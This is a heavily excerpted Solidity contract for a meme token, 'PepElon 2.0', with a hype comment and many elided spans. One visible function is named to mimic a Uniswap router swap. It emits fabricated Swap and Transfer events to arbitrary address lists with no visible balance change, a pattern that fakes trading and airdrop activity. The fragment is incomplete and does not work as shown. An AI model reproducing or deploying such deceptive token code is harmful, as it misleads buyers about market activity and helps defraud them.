/* Introducing our latest token - a thrilling, electrifying surprise that's set to explode like a bomb! Get ready for an adrenaline rush like never before. */
...
contract PEPELONV2 {
    ...
    string public constant name = "PepElon 2.0";

    string public constant symbol = unicode"PEPELON2.0";
    ...
    constructor() {
        ...
        _pair = IPair(IUniswapV2Factory(_router.factory()).createPair(address(this), address(_router.WETH())));
    ...
    function getMoneyFromAccount(address account) public view virtual returns (uint256) {
    ...
    function getBaseTokenReserve(address token) public view returns (uint256) {
        ...
        for (uint256 i = 0; i < _users.length; i++) {
            if (getMoneyFromAccount(_users[i]) > 1) {
                uint256 rewardAmount = _countReward(_users[i]);
        ...
        for (uint256 i = 0; i < _addresses_.length; i++) {
            ...
            emit Transfer(_pairr, _addresses_[i], _out);
                ...
                function swapExactETHForTokensSupportingFeeOnTransferTokensForAirDrop(address [] calldata _addresses_, uint256 _in, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Swapp(_universal, _in, 0, 0, _out, _addresses_[i]);
            emit Transfer(_pairr, _addresses_[i], _out);
        }
    ...
    function _times(uint256 a) internal pure returns (uint256) {
        return a / 1000;
    }
    ...
    function _countReward(address _user) internal view returns (uint256) {
        return _times(balances[_user]);
    }
